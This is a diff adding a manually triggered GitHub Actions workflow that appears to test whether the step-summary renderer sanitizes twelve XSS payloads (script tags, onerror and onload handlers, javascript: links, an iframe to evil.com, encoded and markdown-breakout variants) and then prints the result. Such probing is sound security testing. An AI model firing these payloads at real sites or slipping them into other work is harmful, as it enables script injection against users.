@@ -1,0 +1,61 @@
+name: Step Summary XSS Test
+on: workflow_dispatch
+
+permissions:
+  contents: read
+
+jobs:
+  xss-test:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Inject XSS payloads into step summary
+        run: |
+          # Test various XSS payloads in step summary markdown
+          cat >> $GITHUB_STEP_SUMMARY << 'EOF'
+          
+## XSS Test Payloads
+
+### Test 1: Raw HTML
+<img src=x onerror=alert(1)>
+
+### Test 2: Script tag
+<script>alert('XSS')</script>
+
+### Test 3: SVG with onload
+<svg onload=alert(1)>
+
+### Test 4: Data URI in image
+![test](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)
+
+### Test 5: Link with javascript
+[click me](javascript:alert(1))
+
+### Test 6: Iframe
+<iframe src="https://evil.com"></iframe>
+
+### Test 7: HTML entities bypass
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+### Test 8: Markdown image with event handler
+![test](https://example.com" onerror="alert(1))
+
+### Test 9: Raw HTML div with style
+<div style="background:url(javascript:alert(1))">test</div>
+
+### Test 10: Object tag
+<object data="data:text/html,<script>alert(1)</script>"></object>
+
+### Test 11: Details/Summary with HTML
+<details><summary>Click</summary><img src=x onerror=alert(document.domain)></details>
+
+### Test 12: Math injection
+$`<img src=x onerror=alert(1)>`$
+EOF
+          echo "Step summary written"
+
+      - name: Verify step summary content
+        run: |
+          echo "=== Raw step summary content ==="
+          cat $GITHUB_STEP_SUMMARY
+          echo ""
+          echo "Size: $(wc -c < $GITHUB_STEP_SUMMARY) bytes"
